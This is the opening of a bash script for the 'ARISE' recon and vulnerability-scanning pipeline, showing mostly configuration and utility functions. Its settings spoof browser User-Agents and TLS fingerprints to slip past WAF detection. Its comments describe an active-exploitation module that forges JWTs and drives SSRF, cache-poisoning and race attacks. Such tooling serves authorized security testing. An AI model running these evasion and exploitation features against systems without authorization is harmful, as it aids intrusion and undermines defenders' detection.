#!/bin/bash

###################################################################################################
#                    ARISE SCAN ENGINE  --  "Summon Every Hidden Exposure."                       #
###################################################################################################

set -o pipefail

# Version
readonly VERSION="2.1.0"
readonly SCRIPT_DATE="2026-07-07"

# Colors
readonly BOLD=$(tput bold 2>/dev/null || echo "")
readonly NORMAL=$(tput sgr0 2>/dev/null || echo "")
readonly RED=$(tput setaf 1 2>/dev/null || echo "")
readonly GREEN=$(tput setaf 2 2>/dev/null || echo "")
readonly YELLOW=$(tput setaf 3 2>/dev/null || echo "")
readonly CYAN=$(tput setaf 6 2>/dev/null || echo "")

# Paths
PROJECT_ROOT=""
SCAN_DIR=""
OUTPUT_DIR=""
LOG_DIR=""
TOOL_LOG_DIR=""
MANIFEST_FILE=""

# Scan mode: full (default, everything) | incremental (delta-focused) |
# selective (only --only modules). Set via -m/--mode; consumed in main().
SCAN_MODE="full"

# Port Scanning Configuration
# Options: "fast" (top 1000 ports), "full" (all 65535 ports)
# Default: always scan all 65535 ports; macOS and Docker use lower limits
_in_container() { [ -f /.dockerenv ] || grep -qsE '/docker/|/lxc/' /proc/1/cgroup 2>/dev/null; }
if [ "$(uname -s)" = "Darwin" ]; then
    PORT_SCAN_MODE="${PORT_SCAN_MODE:-full}"
    NAABU_RATE="${NAABU_RATE:-1000}"
    NAABU_THREADS="${NAABU_THREADS:-25}"
elif _in_container; then
    PORT_SCAN_MODE="${PORT_SCAN_MODE:-full}"
    NAABU_RATE="${NAABU_RATE:-1500}"
    NAABU_THREADS="${NAABU_THREADS:-25}"
else
    PORT_SCAN_MODE="${PORT_SCAN_MODE:-full}"
    NAABU_RATE="${NAABU_RATE:-3000}"
    NAABU_THREADS="${NAABU_THREADS:-100}"
fi

# Human User-Agent — sent by every scanner (dirsearch, nuclei, bypass_403,
# access_control_pipeline / WAF classifier). Default is a current Chrome-on-Mac
# string. WAFs commonly rate-limit or outright block requests from tool-shaped
# UAs ("dirsearch/x.y.z", "Nuclei - Open-source project", "python-urllib/*"),
# but happily serve identical browser UAs — so this single string materially
# reduces false-positive blocks in Module 8B (bypass/WAF classify) and
# Module 12 (nuclei) alike. Overridable per-run via the HUMAN_USER_AGENT env
# var if a specific engagement needs a different browser fingerprint.
HUMAN_USER_AGENT="${HUMAN_USER_AGENT:-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36}"
export HUMAN_USER_AGENT

# TLS/JA3 fingerprint stealth — a matching User-Agent doesn't help if the TLS
# ClientHello still screams "Go http2 client" (Akamai/Cloudflare fingerprint
# JA3 independently of UA). nuclei/httpx/katana all ship the same experimental
# `-tlsi/-tls-impersonate` (client-hello/ja3 randomization) flag natively — no
# extra install. Opt-out via TLS_IMPERSONATE_ENABLED=false if a target proves
# incompatible with it (it's marked experimental upstream).
TLS_IMPERSONATE_ENABLED="${TLS_IMPERSONATE_ENABLED:-true}"
TLS_IMPERSONATE_FLAG=""
[ "$TLS_IMPERSONATE_ENABLED" = "true" ] && TLS_IMPERSONATE_FLAG="-tlsi"

# Shared session/cookie jar — without this, every scanner (dirsearch, nuclei,
# katana, gospider, api_intelligence_engine/apisec) starts a cold session, so
# authenticated-only surface is invisible to all but whichever module got a
# manually-supplied token. ARISE_SESSION_JAR (Netscape cookie-jar format, same
# file curl/http.cookiejar read) is re-read before each authenticated-request
# call site so cookies Module 20's CDP crawl captured (login redirects, JS-set
# session cookies) are picked up by every later stage automatically. Empty jar
# = every call site is a no-op (cookie header omitted) — safe with no auth.
# ARISE_SESSION_JAR itself is finalized in create_directories() below, once
# OUTPUT_DIR is known — this only defines the helpers, which are only ever
# invoked later, dynamically, from inside a module_* function.
SESSION_JAR_PY="$PROJECT_ROOT/core/session_jar.py"
# session_cookie_header(): prints "name=value; name2=value2" scoped to $target
# (+ subdomains), or nothing if the jar is empty/missing. Relies on bash's
# dynamic scoping to see the caller module_*() function's `local target` —
# only call this from inside a module_* function, never at top level.
session_cookie_header() {
    [ -f "$SESSION_JAR_PY" ] && [ -f "${ARISE_SESSION_JAR:-}" ] || return 0
    python3 "$SESSION_JAR_PY" --jar "$ARISE_SESSION_JAR" header --domain "$target" 2>/dev/null
}

# Statistics
TOTAL_HOSTS=0
RESOLVED_HOSTS=0
HTTP_HOSTS=0
WAF_HOSTS=0

# Tool paths (set to tool names, will use PATH)
SUBFINDER="subfinder"
PUREDNS="puredns"
DNSX="dnsx"
NAABU="naabu"
# Prefer the Go ProjectDiscovery httpx over the Python encode/httpx CLI
if [[ -x "${GOPATH:-$HOME/go}/bin/httpx" ]]; then
    HTTPX="${GOPATH:-$HOME/go}/bin/httpx"
elif command -v httpx &>/dev/null && httpx -version &>/dev/null 2>&1; then
    HTTPX="httpx"
else
    HTTPX="httpx"
fi
NUCLEI="nuclei"
NMAP="nmap"
GOSPIDER="gospider"
GAU="gau"
FFUF="ffuf"
GF="gf"
TRUFFLEHOG="trufflehog"
DALFOX="dalfox"
DIRSEARCH="dirsearch"
DIRSEARCH_DEEP_PASS="${DIRSEARCH_DEEP_PASS:-true}"              # second pass: re-scan 200-status dirs as base URLs
DIRSEARCH_DEEP_MAX_BASES="${DIRSEARCH_DEEP_MAX_BASES:-80}"      # cap directories fed into pass 2
WAFW00F="wafw00f"
KATANA="katana"

# Cloud recon + audit tooling (Module 17).
CLOUDENUM="${CLOUDENUM:-cloud_enum}"          # AWS/GCP/Azure bucket enumeration
S3SCANNER="${S3SCANNER:-s3scanner}"           # anonymous S3/GCS/Azure access check
PROWLER="${PROWLER:-prowler}"                 # authenticated AWS/Azure/GCP audit
SCOUTSUITE="${SCOUTSUITE:-scout}"             # authenticated multi-cloud audit

# Phase 2 (external, unauthenticated) — bucket enumeration is safe recon and
# runs by default. Phase 3 (authenticated compliance audit) needs the target's
# own cloud credentials, so it stays OFF unless the operator explicitly enables
# it and supplies credentials — you never have these in an external scan.
CLOUD_BUCKET_ENUM_ENABLED="${CLOUD_BUCKET_ENUM_ENABLED:-true}"
CLOUD_BUCKET_MUTATIONS="${CLOUD_BUCKET_MUTATIONS:-}"       # optional extra keywords, comma-sep
CLOUD_AUDIT_ENABLED="${CLOUD_AUDIT_ENABLED:-false}"        # Phase 3 master switch
CLOUD_AUDIT_PROVIDER="${CLOUD_AUDIT_PROVIDER:-aws}"        # aws|gcp|azure
CLOUD_AUDIT_TOOL="${CLOUD_AUDIT_TOOL:-prowler}"            # prowler|scoutsuite

# Extended vulnerability verification (Module 19) — dedicated FOSS scanners that
# CONFIRM classes nuclei can't (blind SSRF, CRLF, JWT, SSTI, GraphQL, smuggling).
INTERACTSH_CLIENT="${INTERACTSH_CLIENT:-interactsh-client}"  # OOB callback oracle
CRLFUZZ="${CRLFUZZ:-crlfuzz}"                                # CRLF injection
JWT_TOOL="${JWT_TOOL:-jwt_tool}"                             # JWT weakness analysis
SSTIMAP="${SSTIMAP:-sstimap}"                               # template injection
GRAPHW00F="${GRAPHW00F:-graphw00f}"                          # GraphQL fingerprint
SMUGGLER="${SMUGGLER:-smuggler}"                            # HTTP request smuggling

# PRODUCTION-SAFE contract: these checks CONFIRM, they do not EXPLOIT.
# EXTENDED_SAFE_MODE=true (default, do not disable on prod) enforces: benign
# payloads only, GET/read-only, no shells/exfil/auth-bypass actions, no state
# mutation. Confirmation comes from OOB callbacks (SSRF), response reflection
# (CRLF), or offline analysis (JWT) — never from weaponization.
EXTENDED_CHECKS_ENABLED="${EXTENDED_CHECKS_ENABLED:-true}"
EXTENDED_SAFE_MODE="${EXTENDED_SAFE_MODE:-true}"
EXTENDED_MAX_URLS="${EXTENDED_MAX_URLS:-300}"      # cap unique endpoints per check (deduped)
EXTENDED_RATE="${EXTENDED_RATE:-40}"               # requests/sec ceiling
EXTENDED_OOB_WAIT="${EXTENDED_OOB_WAIT:-25}"       # seconds to await OOB callbacks
INTERACTSH_SERVER="${INTERACTSH_SERVER:-}"         # optional self-hosted oast server
# Per-check toggles. Smuggling is OFF by default: desync probes can disturb
# other users' requests on shared production frontends.
SSRF_PROBE_CAP="${SSRF_PROBE_CAP:-600}"          # total SSRF probes across all vectors
CHECK_SSRF="${CHECK_SSRF:-true}"
CHECK_CRLF="${CHECK_CRLF:-true}"
CHECK_JWT="${CHECK_JWT:-true}"
CHECK_SSTI="${CHECK_SSTI:-true}"
CHECK_GRAPHQL="${CHECK_GRAPHQL:-true}"
CHECK_SMUGGLING="${CHECK_SMUGGLING:-false}"

# ---------------------------------------------------------------------------
# UNIFIED OFFENSIVE VERIFICATION (offensive/offensive_verify.py) — replaces the two old
# modules that found nothing (Module 19 Extended Verification + Module 24
# Advanced Attacks). One native engine (stdlib+requests, no external binaries)
# that ACTIVELY exploits and confirms every finding with a baseline-vs-attack
# differential. This is NOT safe-mode: it forges JWTs and replays them, runs
# GraphQL introspection, evaluates SSTI, injects CRLF, drives open-redirect /
# SSRF / prototype-pollution / cache-poisoning / race / CSWSH — dropping any
# target that doesn't prove out. Scope is still enforced (ScopeGuard).
OFFENSIVE_VERIFY_ENABLED="${OFFENSIVE_VERIFY_ENABLED:-true}"
OFFENSIVE_RATE="${OFFENSIVE_RATE:-25}"                 # requests/sec ceiling
OFFENSIVE_MAX_TARGETS="${OFFENSIVE_MAX_TARGETS:-300}"  # cap candidates per check
OFFENSIVE_RACE_CONCURRENCY="${OFFENSIVE_RACE_CONCURRENCY:-25}"
OFFENSIVE_CHECKS="${OFFENSIVE_CHECKS:-}"               # optional csv allowlist of checks
OFFENSIVE_OOB_DOMAIN="${OFFENSIVE_OOB_DOMAIN:-}"       # optional interactsh/OOB domain

# Adaptive Endpoint Attack Loop (offensive/adaptive_loop.py) — per-endpoint FSM
# that mutates+fires+verifies from the URL inventory & response_intel hypotheses,
# GET/OPTIONS-only, differential-confirmed. Opt-in (new; validate live first).
ADAPTIVE_LOOP_ENABLED="${ADAPTIVE_LOOP_ENABLED:-false}"
ADAPTIVE_LOOP_AI="${ADAPTIVE_LOOP_AI:-false}"           # enable the P4 AI brain
ADAPTIVE_LOOP_MAX_REQUESTS="${ADAPTIVE_LOOP_MAX_REQUESTS:-300}"
ADAPTIVE_LOOP_MAX_SEEDS="${ADAPTIVE_LOOP_MAX_SEEDS:-200}"
ADAPTIVE_LOOP_BUDGET="${ADAPTIVE_LOOP_BUDGET:-600}"    # wall-clock seconds
OFFENSIVE_TIMEOUT="${OFFENSIVE_TIMEOUT:-1800}"         # wall-clock cap for the module

# ── Nuclei wall-clock caps (seconds) ──────────────────────────────────────
# Without caps the deep-URL scan alone can run 12+ hours on large targets.
# -max-time is nuclei v3's graceful shutdown; run_tool_timeout is the hard kill.
NUCLEI_PHASE1_MAX_TIME="${NUCLEI_PHASE1_MAX_TIME:-2400}"    # Scan 1: host roots (40 min)
NUCLEI_DEEP_MAX_TIME="${NUCLEI_DEEP_MAX_TIME:-3600}"        # Scan 2: deep URLs  (60 min)
NUCLEI_DEEP_URL_CAP="${NUCLEI_DEEP_URL_CAP:-3000}"          # max URLs for Scan 2 (was 8000)
NUCLEI_NET_MAX_TIME="${NUCLEI_NET_MAX_TIME:-900}"            # Scan 3: non-web    (15 min)
NUCLEI_SYNTH_MAX_TIME="${NUCLEI_SYNTH_MAX_TIME:-1200}"       # Synth targeted     (20 min)
NUCLEI_DAST_MAX_TIME="${NUCLEI_DAST_MAX_TIME:-900}"          # DAST per lane      (15 min)
NUCLEI_CLOUD_MAX_TIME="${NUCLEI_CLOUD_MAX_TIME:-1200}"       # Cloud exposure     (20 min)
NUCLEI_NONWEB_RATE="${NUCLEI_NONWEB_RATE:-100}"              # Non-web rate limit

# Safety/performance bounds for active testing. Override explicitly when authorized.
PARAM_FUZZ_MAX_URLS="${PARAM_FUZZ_MAX_URLS:-50}"
JS_DOWNLOAD_MAX="${JS_DOWNLOAD_MAX:-500}"
PUREDNS_ENABLED="${PUREDNS_ENABLED:-true}"
PUREDNS_WORDLIST_LIMIT="${PUREDNS_WORDLIST_LIMIT:-5000}"
PUREDNS_RESOLVER_LIMIT="${PUREDNS_RESOLVER_LIMIT:-50}"
PUREDNS_RATE_LIMIT="${PUREDNS_RATE_LIMIT:-100}"
PUREDNS_TRUSTED_RATE_LIMIT="${PUREDNS_TRUSTED_RATE_LIMIT:-25}"
PUREDNS_THREADS="${PUREDNS_THREADS:-10}"
PUREDNS_WILDCARD_BATCH="${PUREDNS_WILDCARD_BATCH:-100}"
PUREDNS_WILDCARD_TESTS="${PUREDNS_WILDCARD_TESTS:-1}"

###################################################################################################
# UTILITY FUNCTIONS
###################################################################################################

log_info() {
    echo -e "${GREEN}[INFO]${NORMAL} $1"
    [ -n "$LOG_DIR" ] && [ -d "$LOG_DIR" ] && echo "[INFO] $(date) - $1" >> "$LOG_DIR/pipeline.log"
}

log_warn() {
    echo -e "${YELLOW}[WARN]${NORMAL} $1"
    [ -n "$LOG_DIR" ] && [ -d "$LOG_DIR" ] && echo "[WARN] $(date) - $1" >> "$LOG_DIR/pipeline.log"
}

log_error() {
    echo -e "${RED}[ERROR]${NORMAL} $1" >&2
    [ -n "$LOG_DIR" ] && [ -d "$LOG_DIR" ] && echo "[ERROR] $(date) - $1" >> "$LOG_DIR/pipeline.log"
}

log_section() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NORMAL}"
    echo -e "${CYAN}  $1${NORMAL}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NORMAL}"
}

log_debug() {
    [ -n "$DEBUG" ] && echo -e "${CYAN}[DEBUG]${NORMAL} $1"
}

# run_tool <label> <command...>
# Runs an external tool, letting its stdout pass through untouched (so pipes and
# $(...) capture keep working) while capturing the exact command, all stderr, and
# the exit code into a dedicated per-tool log at $TOOL_LOG_DIR/<label>.log.
# Console output is unchanged; use the tool logs to debug why a tool produced
# no results (e.g. httpx returning 0 hosts). Returns the tool's own exit code.
#
# F21 (ARISE_REMEDIATION_ROADMAP.md): this used to have NO timeout at all — a
# single hung binary (a stalled TCP connection, a target that never responds)
# blocked the entire 52-module pipeline indefinitely. run_tool_timeout()
# already existed for callers that want a tool-appropriate cap, but every
# call site using bare run_tool() had zero protection. RUN_TOOL_DEFAULT_CAP
# is a generous safety-net ceiling, not a tuned per-tool budget — callers
# that need a tighter, tool-appropriate cap should still use
# run_tool_timeout() directly; this only guarantees NOTHING can hang forever.
RUN_TOOL_DEFAULT_CAP="${RUN_TOOL_DEFAULT_CAP:-1800}"

run_tool() {
    local label="$1"; shift
    local tlog="/dev/null"
    if [ -n "$TOOL_LOG_DIR" ]; then
        mkdir -p "$TOOL_LOG_DIR" 2>/dev/null
        tlog="$TOOL_LOG_DIR/${label}.log"
    fi
    {
        printf '\n==== %s | %s ====\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$label"
        printf 'CMD: %s (default safety cap %ss)\n' "$*" "$RUN_TOOL_DEFAULT_CAP"
    } >> "$tlog" 2>/dev/null
    _arise_run_with_timeout "$RUN_TOOL_DEFAULT_CAP" "$@" 2>> "$tlog"
    local rc=$?
    if [ "$rc" -eq 124 ]; then
        printf 'TIMEOUT: exceeded default %ss safety cap, killed | %s\n' \
            "$RUN_TOOL_DEFAULT_CAP" "$(date '+%Y-%m-%d %H:%M:%S')" >> "$tlog" 2>/dev/null
    else
        printf 'EXIT: %s | %s\n' "$rc" "$(date '+%Y-%m-%d %H:%M:%S')" >> "$tlog" 2>/dev/null
    fi
    return $rc
}

# Same logging contract as run_tool(), but with a wall-clock cap. NOT simply
# "_arise_run_with_timeout run_tool ..." — run_tool is a bash function whose
# own body blocks synchronously on "$@" 2>>"$tlog"; backgrounding a *function*
# reproduces the exact wrapper-shell-blocks-on-its-child bug this file's
# timeout helper was built to avoid (verified against a live test: SIGTERM
# to a `bash -c 'a; b'` wrapper doesn't reach the child while the wrapper is
# in wait()). So the cap is applied directly to the real binary here, and the
# CMD/EXIT logging run_tool normally provides is reproduced inline.
run_tool_timeout() {
    local cap="$1" label="$2"; shift 2
    local tlog="/dev/null"
    if [ -n "$TOOL_LOG_DIR" ]; then
        mkdir -p "$TOOL_LOG_DIR" 2>/dev/null
        tlog="$TOOL_LOG_DIR/${label}.log"
    fi
    {
        printf '\n==== %s | %s ====\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$label"
        printf 'CMD: %s (cap %ss)\n' "$*" "$cap"
    } >> "$tlog" 2>/dev/null
    _arise_run_with_timeout "$cap" "$@" 2>> "$tlog"
    local rc=$?
    if [ "$rc" -eq 124 ]; then
        printf 'TIMEOUT: exceeded %ss cap, killed | %s\n' "$cap" "$(date '+%Y-%m-%d %H:%M:%S')" >> "$tlog" 2>/dev/null
    else
        printf 'EXIT: %s | %s\n' "$rc" "$(date '+%Y-%m-%d %H:%M:%S')" >> "$tlog" 2>/dev/null
    fi
    return $rc
}

get_iso_timestamp() {
    date '+%Y%m%d_%H%M%S'
}

make_iso_filename() {
    local target="$1"
    local module="$2"
    local type="$3"
    local safe_target=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    echo "${safe_target}_$(get_iso_timestamp)_${module}_${type}.json"
}

count_lines() {
    [ -s "$1" ] && wc -l < "$1" | tr -d ' ' || echo 0
}

# Pick a `timeout` binary if one exists (GNU coreutils `timeout`, or `gtimeout`
# on macOS via `brew install coreutils`). Empty string ⇒ neither is installed
# (the default on stock macOS) and callers must use _arise_timeout's bash-native
# fallback below. Cached after first call since it never changes mid-run.
_ARISE_TIMEOUT_BIN_CACHED=""
_ARISE_TIMEOUT_BIN_CHECKED=false
_arise_timeout_bin() {
    if [ "$_ARISE_TIMEOUT_BIN_CHECKED" != true ]; then
        _ARISE_TIMEOUT_BIN_CHECKED=true
        if command -v timeout >/dev/null 2>&1; then
            _ARISE_TIMEOUT_BIN_CACHED="timeout"
        elif command -v gtimeout >/dev/null 2>&1; then
            _ARISE_TIMEOUT_BIN_CACHED="gtimeout"
        fi
    fi
    printf '%s' "$_ARISE_TIMEOUT_BIN_CACHED"
}

# Portable wall-clock cap for any command. Prints the command's stdout;
# returns 124 if the cap was hit (matching GNU `timeout`'s convention), else
# the command's own exit code. Use this everywhere instead of a bare
# `timeout N cmd` — this machine class (stock macOS) ships neither `timeout`
# nor `gtimeout`, so a bare call to either name fails with "command not
# found", is swallowed by `2>/dev/null`, and silently no-ops the command it
# was meant to bound (exactly what happened with the first SSTI timeout fix).
# When neither binary is present, falls back to a bash-native watchdog:
# background the command, poll, SIGTERM then SIGKILL on cap (same pattern
# already proven in _sqli_timeout_bin()/_sqli_run_sqlmap()).
_arise_run_with_timeout() {
    local cap="$1"; shift
    local to_bin; to_bin=$(_arise_timeout_bin)

    if [ -n "$to_bin" ]; then
        "$to_bin" -k 10 "$cap" "$@"
        return $?
    fi

    "$@" &
    local cmd_pid=$! rc=0 waited=0
    while kill -0 "$cmd_pid" 2>/dev/null; do
        if [ "$waited" -ge "$cap" ]; then
            kill -TERM "$cmd_pid" 2>/dev/null
            sleep 5
            kill -KILL "$cmd_pid" 2>/dev/null
            wait "$cmd_pid" 2>/dev/null
            return 124
        fi
        sleep 2
        waited=$((waited + 2))
    done
    wait "$cmd_pid" 2>/dev/null; rc=$?
    return $rc
}

safe_name() {
    printf '%s' "$1" | sed 's/[^a-zA-Z0-9._-]/_/g'
}

url_host() {
    local value="${1#*://}"
    value="${value%%/*}"
    printf '%s\n' "${value%%:*}"
}

# Scope filter helpers — single source of truth so every stage of the pipeline
# uses the SAME suffix-anchored, case-insensitive match. Historically the same
# awk snippet was duplicated 4× with subtle drift (some case-sensitive, some
# not), and the Wayback CDX fallback branch skipped the filter entirely — a
# real bug where off-scope URLs (search engines, referring pages) polluted
# gau_urls.txt for large targets. Consolidating here fixes that class of bug.
#
# _scope_hosts_awk: filter a stream of bare hostnames (one per line), keeping
#     only those equal to root or a subdomain of root.
# _scope_urls_awk:  filter a stream of URLs (schemes required), keeping only
#     those whose host is in scope. Host is column 3 after -F/, port stripped.
_scope_hosts_awk() {
    local root="$1"
    awk -v root="$(printf '%s' "$root" | tr 'A-Z' 'a-z')" '
        { h=tolower($0); sub(/:.*/, "", h) }
        h == root || h ~ ("\\." root "$") { print h }
    '
}
_scope_urls_awk() {
    local root="$1"
    awk -F/ -v root="$(printf '%s' "$root" | tr 'A-Z' 'a-z')" '
        NF >= 3 { h=tolower($3); sub(/:.*/, "", h);
                  if (h == root || h ~ ("\\." root "$")) print $0 }
    '
}

ensure_positive_int() {
    local var_name="$1"
    local default_value="$2"
    local current_value="${!var_name}"
    if ! printf '%s' "$current_value" | grep -Eq '^[1-9][0-9]*$'; then
        log_warn "$var_name must be a positive integer; using $default_value"
        eval "$var_name=\"$default_value\""
    fi
}

validate_runtime_limits() {
    ensure_positive_int "PUREDNS_WORDLIST_LIMIT" "5000"
    ensure_positive_int "PUREDNS_RESOLVER_LIMIT" "50"
    ensure_positive_int "PUREDNS_RATE_LIMIT" "100"
    ensure_positive_int "PUREDNS_TRUSTED_RATE_LIMIT" "25"
    ensure_positive_int "PUREDNS_THREADS" "10"
    ensure_positive_int "PUREDNS_WILDCARD_BATCH" "100"
    ensure_positive_int "PUREDNS_WILDCARD_TESTS" "1"
}

###################################################################################################
# MANIFEST MANAGEMENT
###################################################################################################

init_manifest() {
    local target="$1"
    local scan_id="$2"

    MANIFEST_FILE="$OUTPUT_DIR/manifest.json"

    # If a prior snapshot was seeded (selective/incremental mode), preserve
    # its host data — only update pipeline_info so the new run is tracked.
    if [ -s "$MANIFEST_FILE" ]; then
        local tmp="${MANIFEST_FILE}.init_tmp"
        jq --arg ver "$VERSION" --arg tgt "$target" --arg sid "$scan_id" \
           --arg ts "$(date -Iseconds)" \
           '.pipeline_info = {version:$ver, target:$tgt, scan_id:$sid, start_time:$ts, status:"running"}' \
           "$MANIFEST_FILE" > "$tmp" 2>/dev/null && mv "$tmp" "$MANIFEST_FILE"
        log_info "Manifest updated (seeded data preserved): $MANIFEST_FILE"
        return 0
    fi

    cat > "$MANIFEST_FILE" << EOF
{
  "pipeline_info": {
    "version": "$VERSION",
    "target": "$target",
    "scan_id": "$scan_id",
    "start_time": "$(date -Iseconds)",
    "status": "running"
  },
  "statistics": {
    "total_hosts": 0,
    "resolved_hosts": 0,
    "http_hosts": 0,
    "waf_hosts": 0
  },
  "hosts": {}
}
EOF
    log_info "Manifest initialized: $MANIFEST_FILE"
}

# ── Crash trap (F23, ARISE_REMEDIATION_ROADMAP.md) ─────────────────────────
# Previously: a killed/crashed process left manifest.json's pipeline_info.
# status stuck at "running" forever — the only place status ever changed was
# the success path at the very end of main(), so an operator (or the
# dashboard) had no way to distinguish "still actually running" from
# "died 6 hours ago" for any run that didn't reach that line. This fires on
# ANY exit path (normal completion, an uncaught error, Ctrl-C/SIGINT, or a
# plain `kill`/SIGTERM) and writes an honest terminal status unless the
# normal-completion path already finalized one. This cannot and does not
# claim to catch `kill -9`/OOM-kill — no process can trap its own SIGKILL,
# in any language; that class of failure needs an external monitor (a
# supervisor process checking manifest mtime), which is a separate,
# larger concern than this fix.
PIPELINE_STATUS_FINALIZED=false

_arise_crash_handler() {
    local exit_code=$?
    [ "$PIPELINE_STATUS_FINALIZED" = "true" ] && return
    [ -z "$MANIFEST_FILE" ] && return
    [ -f "$MANIFEST_FILE" ] || return

    local reason="interrupted"
    [ "$exit_code" -ne 0 ] && [ "$exit_code" -lt 128 ] && reason="crashed"
    [ "$exit_code" -ge 128 ] && reason="killed (signal $((exit_code - 128)))"

    jq --arg status "$reason" --arg endtime "$(date -Iseconds)" --arg code "$exit_code" \
        '.pipeline_info.status = $status | .pipeline_info.end_time = $endtime | .pipeline_info.exit_code = ($code | tonumber)' \
        "$MANIFEST_FILE" > "${MANIFEST_FILE}.crash_tmp" 2>/dev/null && \
        mv "${MANIFEST_FILE}.crash_tmp" "$MANIFEST_FILE" 2>/dev/null

    local crash_file
    crash_file="$(dirname "$MANIFEST_FILE")/scan_crash.json"
    cat > "$crash_file" << EOF 2>/dev/null
{
  "status": "$reason",
  "exit_code": $exit_code,
  "timestamp": "$(date -Iseconds)",
  "note": "Pipeline did not reach normal completion. This file is written by a crash trap and does not exist on a clean run."
}
EOF
}

# ── Cross-platform mutex on manifest.json ──────────────────────────
# Uses mkdir (POSIX-atomic on macOS + Linux; flock is Linux-only).
# Each caller retries briefly, then proceeds without lock on timeout
# to guarantee forward progress rather than silent data loss.
_manifest_lock_acquire() {
    local lock_dir="${MANIFEST_FILE}.lock.d"
    local i=0
    while [ $i -lt 50 ]; do
        if mkdir "$lock_dir" 2>/dev/null; then
            return 0
        fi
        # Reclaim stale locks (>60s old) — a previous run may have crashed
        if [ -d "$lock_dir" ]; then
            local age
            age=$(( $(date +%s) - $(stat -f %m "$lock_dir" 2>/dev/null || stat -c %Y "$lock_dir" 2>/dev/null || echo 0) ))
            if [ "$age" -gt 60 ]; then
                rmdir "$lock_dir" 2>/dev/null
            fi
        fi
        sleep 0.1
        i=$((i + 1))
    done
    return 1  # caller may still proceed; race is rare and we prefer progress
}

_manifest_lock_release() {
    rmdir "${MANIFEST_FILE}.lock.d" 2>/dev/null || true
}

update_manifest() {
    local host="$1"
    local key="$2"
    local value="$3"

    [ ! -f "$MANIFEST_FILE" ] && return 1

    _manifest_lock_acquire

    if ! jq -e ".hosts[\"$host\"]" "$MANIFEST_FILE" &>/dev/null; then
        jq --arg h "$host" '.hosts += {($h): {}}' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" 2>/dev/null && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE" 2>/dev/null
    fi

    jq --arg h "$host" --arg k "$key" --arg v "$value" '.hosts[$h][$k] = ($v | fromjson)' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" 2>/dev/null && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE" 2>/dev/null

    _manifest_lock_release
}

update_manifest_bulk() {
    local host="$1"
    local json_obj="$2"

    [ ! -f "$MANIFEST_FILE" ] && return 1

    _manifest_lock_acquire

    if ! jq -e ".hosts[\"$host\"]" "$MANIFEST_FILE" &>/dev/null; then
        jq --arg h "$host" '.hosts += {($h): {}}' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" 2>/dev/null && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE" 2>/dev/null
    fi

    jq --arg h "$host" --arg obj "$json_obj" '.hosts[$h] += ($obj | fromjson)' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" 2>/dev/null && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE" 2>/dev/null

    _manifest_lock_release
}

# Batch-merge many host deltas into the manifest in a SINGLE pass.
# Input: a TSV file whose lines are "<host>\t<json-object-delta>". Each delta is
# shallow-merged into .hosts[host]. This replaces per-host update_manifest loops
# that each spawned 2-3 jq processes and rewrote the WHOLE (growing) manifest —
# O(N^2) file I/O + O(N) process spawns. One read + one write here regardless of
# host count. Pure local file work: no network, so no WAF exposure.
update_manifest_stream() {
    local tsv="$1"
    [ ! -f "$MANIFEST_FILE" ] && return 1
    [ ! -s "$tsv" ] && return 0
    _manifest_lock_acquire
    python3 - "$MANIFEST_FILE" "$tsv" <<'PY_MANIFEST_MERGE' 2>/dev/null
import json, os, sys
mf, tsv = sys.argv[1], sys.argv[2]
try:
    with open(mf) as f:
        m = json.load(f)
except Exception:
    sys.exit(0)
m.setdefault("hosts", {})
with open(tsv, errors="ignore") as f:
    for line in f:
        line = line.rstrip("\n")
        if not line or "\t" not in line:
            continue
        host, delta = line.split("\t", 1)
        if not host:
            continue
        try:
            d = json.loads(delta)
        except Exception:
            continue
        m["hosts"].setdefault(host, {}).update(d)
tmp = mf + ".tmp"
with open(tmp, "w") as f:
    json.dump(m, f)
os.replace(tmp, mf)
PY_MANIFEST_MERGE
    _manifest_lock_release
}

get_manifest() {
    local host="$1"
    local key="$2"
    jq -r ".hosts[\"$host\"][\"$key\"] // empty" "$MANIFEST_FILE" 2>/dev/null
}

get_hosts_where() {
    local filter="$1"
    jq -r ".hosts | to_entries[] | select(.value$filter) | .key" "$MANIFEST_FILE" 2>/dev/null
}

update_statistics() {
    local stat="$1"
    local val="${2:-0}" # Default to 0 if empty
    [ ! -f "$MANIFEST_FILE" ] && return 1
    _manifest_lock_acquire
    jq --arg s "$stat" --arg v "$val" '.statistics[$s] = ($v | fromjson)' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" 2>/dev/null && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE" 2>/dev/null
    _manifest_lock_release
}

###################################################################################################
# SETUP FUNCTIONS
###################################################################################################

create_directories() {
    local target="$1"
    
    PROJECT_ROOT="$(pwd)"
    SCAN_DIR="$PROJECT_ROOT/scans"
    SCOPE_DIR="$PROJECT_ROOT/scope"
    
    # Create scan-specific directory with timestamp (engineering style: target-DDMMYY-HHMM)
    local safe_target=$(echo "$target" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local scan_timestamp=$(date +%d%m%y-%H%M)
    if [ -z "$OUTPUT_DIR" ]; then
        OUTPUT_DIR="$SCAN_DIR/${safe_target}-${scan_timestamp}"
    else
        OUTPUT_DIR="${OUTPUT_DIR%/}"
    fi
    LOG_DIR="$OUTPUT_DIR/logs"
    TOOL_LOG_DIR="$LOG_DIR/tools"

    # AI Hardening Phase 0 — expose the scan dir + project root so the unified
    # provider layer (core/ai_provider.py) logs every AI call to this scan's
    # logs/ai_runlog.jsonl and resolves `-m ai_analyst` regardless of cwd.
    export ARISE_SCAN_DIR="$OUTPUT_DIR"
    export ARISE_PROJECT_ROOT="$PROJECT_ROOT"

    # Create root directories
    mkdir -p "$SCAN_DIR" "$SCOPE_DIR" "$LOG_DIR" "$TOOL_LOG_DIR"
    
